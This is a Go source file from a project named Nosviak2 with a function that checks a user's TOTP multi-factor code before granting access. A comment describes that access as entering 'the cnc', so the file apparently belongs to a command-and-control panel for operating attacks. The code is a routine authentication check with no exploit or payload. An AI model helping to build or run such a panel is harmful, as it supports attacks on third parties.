package routes

import (
	"Nosviak2/core/clients/sessions"
	"Nosviak2/core/configs"
	"Nosviak2/core/sources/language"
	"errors"

	"github.com/xlzd/gotp"
	"golang.org/x/term"
)

//verifys mfa code which the user needs properly
//this will ensure its done without errors happening on purpose
func VerifyMFA(session sessions.Session) error { //err handles properly and safely

	//tries to render the mfa banner
	//this will display when mfa is prompted
	err := language.ExecuteLanguage([]string{"views", "mfa", "mfa-splash.itl"}, session.Channel, deployment.Engine, &session, make(map[string]string))
	if err != nil { //err handles properly
		return err
	}

	//tries to render the prompt banner
	//this will be what shows on the same line as input
	err = language.ExecuteLanguage([]string{"views", "mfa", "prompt.itl"}, session.Channel, deployment.Engine, &session, make(map[string]string))
	if err != nil { //err handles properly
		return err
	}

	//tries to input the system properly
	//this will hopefully handle without errors
	Given, err := term.NewTerminal(session.Channel, "").ReadLine()
	if err != nil { //err handles properly
		return err
	}

	
	//correct mfa code has been given here
	//allows them to enter the cnc without errors
	if gotp.NewDefaultTOTP(session.User.MFA_secret).Now() == Given {
		return nil
	}


	//invalid mfa code here given properly
	//this will ensure its done without errors happening
	language.ExecuteLanguage([]string{"views", "mfa", "invalid_code.itl"}, session.Channel, deployment.Engine, &session, make(map[string]string))
	
	
	//err handles properly returned
	//this will ensure its done without errors
	return errors.New("invalid mfa input given")
}